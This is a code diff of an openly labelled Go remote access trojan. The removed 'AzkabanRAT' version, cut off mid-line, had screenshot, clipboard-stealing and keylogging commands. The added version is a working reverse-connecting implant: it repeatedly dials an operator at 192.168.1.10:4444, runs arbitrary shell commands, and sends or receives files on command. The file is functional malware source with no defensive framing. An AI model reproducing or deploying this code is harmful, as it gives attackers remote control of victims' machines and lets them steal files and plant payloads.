@@ -1,66 +1,86 @@
+
+// Enhanced RAT core with auto-reconnect, command handler, and file upload/download
 package main
 
 import (
-    "bufio"
-    "fmt"
-    "net"
-    "os/exec"
-    "strings"
-
-    "./clipboard"
-    "./keylogger"
-    "./screenshot"
+	"bufio"
+	"fmt"
+	"io"
+	"net"
+	"os"
+	"os/exec"
+	"strings"
+	"time"
 )
 
 const (
-    LHOST = "192.168.1.10" // Replace with your Kali IP
-    LPORT = "4444"
+	LHOST = "192.168.1.10"
+	LPORT = "4444"
 )
 
-func handleConnection(conn net.Conn) {
-    defer conn.Close()
-
-    reader := bufio.NewReader(conn)
-
-    for {
-        commandLine, err := reader.ReadString('\n')
-        if err != nil {
-            break
-        }
-
-        cmd := strings.TrimSpace(commandLine)
-
-        switch {
-        case cmd == "exit":
-            conn.Write([]byte("[AzkabanRAT] Farewell, master.\n"))
-            return
-
-        case strings.HasPrefix(cmd, "cmd "):
-            output := runShellCommand(strings.TrimPrefix(cmd, "cmd "))
-            conn.Write([]byte(output))
-
-        case cmd == "screenshot":
-            filename := "screenshot.png"
-            err := screenshot.CaptureAndSave(filename)
-            if err != nil {
-                conn.Write([]byte("[AzkabanRAT] Screenshot failed.\n"))
-            } else {
-                conn.Write([]byte("[AzkabanRAT] Screenshot captured.\n"))
-            }
-
-        case cmd == "clipboard":
-            text := clipboard.ReadClipboard()
-            conn.Write([]byte("[AzkabanRAT] Clipboard content: " + text + "\n"))
-
-        case cmd == "keylog":
-            conn.Write([]byte("[AzkabanRAT] Keylogging started. Press CTRL+C to stop.\n"))
-            keylogger.StartLogging()
-
-        default:
-            conn.Write([]byte("[AzkabanRAT] Unknown spell: " + cmd + "\n"))
-        }
-    }
+func main() {
+	for {
+		conn, err := net.Dial("tcp", LHOST+":"+LPORT)
+		if err == nil {
+			handleConnection(conn)
+		}
+		time.Sleep(10 * time.Second)
+	}
 }
 
-func runShellCommand(cmd string) string {
-    out, err := exec.Command("cmd", "/C", cmd).CombinedOutpu
+func handleConnection(conn net.Conn) {
+	defer conn.Close()
+	r := bufio.NewReader(conn)
+
+	for {
+		cmdLine, err := r.ReadString('\n')
+		if err != nil {
+			break
+		}
+		cmd := strings.TrimSpace(cmdLine)
+
+		switch {
+		case cmd == "exit":
+			return
+		case strings.HasPrefix(cmd, "cmd "):
+			output := runShell(strings.TrimPrefix(cmd, "cmd "))
+			conn.Write([]byte(output))
+		case strings.HasPrefix(cmd, "download "):
+			sendFile(conn, strings.TrimPrefix(cmd, "download "))
+		case strings.HasPrefix(cmd, "upload "):
+			receiveFile(conn, strings.TrimPrefix(cmd, "upload "))
+		default:
+			conn.Write([]byte("[RAT] Unknown command\n"))
+		}
+	}
+}
+
+func runShell(command string) string {
+	cmd := exec.Command("sh", "-c", command)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Sprintf("[RAT] Error: %v\n", err)
+	}
+	return string(out)
+}
+
+func sendFile(conn net.Conn, path string) {
+	file, err := os.Open(path)
+	if err != nil {
+		conn.Write([]byte("[RAT] Failed to open file\n"))
+		return
+	}
+	defer file.Close()
+	io.Copy(conn, file)
+}
+
+func receiveFile(conn net.Conn, path string) {
+	file, err := os.Create(path)
+	if err != nil {
+		conn.Write([]byte("[RAT] Failed to create file\n"))
+		return
+	}
+	defer file.Close()
+	io.CopyN(file, conn, 1024*1024) // limit to 1MB for now
+	conn.Write([]byte("[RAT] Upload complete\n"))
+}
